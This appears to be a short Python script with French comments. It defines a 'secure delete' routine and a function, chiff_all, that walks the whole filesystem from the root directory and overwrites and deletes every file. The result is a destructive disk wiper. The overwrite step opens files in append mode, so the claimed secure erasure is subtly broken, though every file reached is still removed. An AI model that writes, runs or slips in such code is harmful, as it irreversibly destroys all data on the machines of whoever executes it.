import os
import asyncio
import sys
from pathlib import Path
async def secure_delete(file_path, passes=5):
    if not os.path.exists(file_path):
        return f"[-] Erreur : Le fichier '{file_path}' est introuvable."

    try:
        file_size = os.path.getsize(file_path)

        # Ouverture en mode écriture binaire
        with open(file_path, "ba+") as f:
            for i in range(1, passes + 1):
                f.seek(0)
                # Écrit des données aléatoires de la même taille que le fichier
                f.write(os.urandom(file_size))
                f.flush()
                os.fsync(f.fileno()) # Force l'écriture physique sur le stockage

        # Suppression définitive du lien vers le fichier
        os.remove(file_path)

    except Exception as e:
        return f"[-] Une erreur est survenue : {e}"


async def chiff_all():
    osname_path = "/" if os.name != "nt" else "C:\\"
    root = Path(osname_path)

    try:
        for dossier, _, files in os.walk(root, onerror=lambda e: None):
            for n in files:
                ch = os.path.join(dossier, n)
                await secure_delete(ch)
        return "fini avec succes"
    except Exception as e:
        return f"error:{e}"






